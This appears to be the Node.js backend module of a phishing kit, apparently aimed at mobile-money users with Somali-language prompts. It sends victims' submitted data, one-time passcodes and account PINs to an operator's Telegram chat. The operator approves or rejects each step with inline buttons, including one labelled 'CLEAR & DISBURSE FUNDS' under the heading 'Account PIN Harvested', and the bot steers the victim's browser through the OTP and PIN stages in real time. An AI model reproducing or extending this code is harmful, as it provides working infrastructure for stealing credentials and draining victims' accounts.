require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
    console.error("❌ [BOT MANAGER ERROR] Missing BOT_TOKEN or ADMIN_CHAT_ID inside environment configs.");
}

// Initialize the Telegram Bot Engine using webhook/passive mode
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

/**
 * Strips out characters that break Telegram Markdown parsing
 */
function escapeMarkdown(text) {
    if (!text) return '';
    return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

/**
 * Standard Log Streams: Dispatches clean profiles to the Admin Telegram channel
 */
function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
    if (!CHAT_ID) return;

    let detailedFields = '';
    if (data && typeof data === 'object') {
        Object.entries(data).forEach(([key, val]) => {
            if (val !== undefined && val !== null && val !== '') {
                detailedFields += `• *${escapeMarkdown(key)}:* \`${escapeMarkdown(val)}\`\n`;
            }
        });
    } else if (data) {
        detailedFields += `• *Data Payload:* \`${escapeMarkdown(data)}\`\n`;
    }

    const message = `
📱 *Congo Application: ${escapeMarkdown(appId)}*
━━━━━━━━━━━━━━━━━━━━━━━━
📢 *${escapeMarkdown(stepTitle)}*
━━━━━━━━━━━━━━━━━━━━━━━━
${detailedFields}━━━━━━━━━━━━━━━━━━━━━━━━
Status: *State Log Processed*
    `.trim();

    const options = { parse_mode: 'Markdown' };

    if (requireInlineButtons) {
        options.reply_markup = {
            inline_keyboard: [[
                { text: "✅ APPROVE OTP", callback_data: `approve_otp:${appId}` },
                { text: "❌ REJECT OTP", callback_data: `reject_otp:${appId}` }
            ]]
        };
    }

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => console.log(`✅ [TELEGRAM] Log payload dispatched for ${appId}`))
        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Dispatch failed for ${appId}:`, err.message));
}

/**
 * Step 5: Dispatches the final transaction approval card
 */
function sendFinalApproval(appId, pinCode) {
    if (!CHAT_ID) return;

    const message = `
💳 *Account PIN Harvested for ID: ${escapeMarkdown(appId)}*
━━━━━━━━━━━━━━━━━━━━━━━━
• *Target Account PIN:* \`${escapeMarkdown(pinCode)}\`
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting Disbursement Confirmation Action*
    `.trim();

    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "💰 CLEAR & DISBURSE FUNDS", callback_data: `approve_pin:${appId}` },
                { text: "❌ REJECT PIN", callback_data: `reject_pin:${appId}` }
            ]]
        }
    };

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => console.log(`✅ [TELEGRAM] Step 5 operational PIN dispatch completed for ${appId}`))
        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Step 5 PIN dispatch failed:`, err.message));
}

// Telegram Inline Interactive Webhook Processing Engine
bot.on('callback_query', async (callbackQuery) => {
    const actionData = callbackQuery.data;
    const message = callbackQuery.message;
    
    if (!actionData) return;
    
    const [actionSignal, targetAppId] = actionData.split(':');
    let auditLogExecutionState = '';
    
    if (!global.io) {
        console.error("❌ [BOT MANAGER ERROR] global.io reference missing.");
        return;
    }

    // FIX BUG 2: Change emission to match frontend tracking listener 'admin-approve-otp'
    if (actionSignal === 'approve_otp') {
        global.io.to(targetAppId).emit('admin-approve-otp');
        auditLogExecutionState = "✅ OTP status verified. Frontend shifted to secure PIN mode.";
    } else if (actionSignal === 'reject_otp') {
        global.io.to(targetAppId).emit('otp-failed', { message: "Code-ka OTP-ga aad gelisay waa khalad." });
        auditLogExecutionState = "❌ OTP signature flagged invalid. Verification error sent to user.";
    } else if (actionSignal === 'approve_pin') {
        const generatedRef = 'COD-' + Math.floor(100000 + Math.random() * 900000);
        global.io.to(targetAppId).emit('pin-verified', { referenceId: generatedRef });
        auditLogExecutionState = "💰 FINAL DISBURSEMENT RUN COMPLETE. Reference signature locked.";
    } else if (actionSignal === 'reject_pin') {
        global.io.to(targetAppId).emit('pin-failed', { message: "PIN-ka koontada aad gelisay waa khalad." });
        auditLogExecutionState = "❌ Wallet security PIN matched incorrect code. Input reset issued.";
    }

    // Update the administrative card view inside Telegram to prevent double clicks
    try {
        await bot.editMessageText(`${message.text}\n\n🤖 *Audit Log Execution State:*\n_${auditLogExecutionState}_`, {
            chat_id: CHAT_ID,
            message_id: message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {
        console.error("❌ [TELEGRAM UI UPDATE ERROR]", e.message);
    }
});

module.exports = {
    bot,
    sendToAdmin,
    sendFinalApproval
};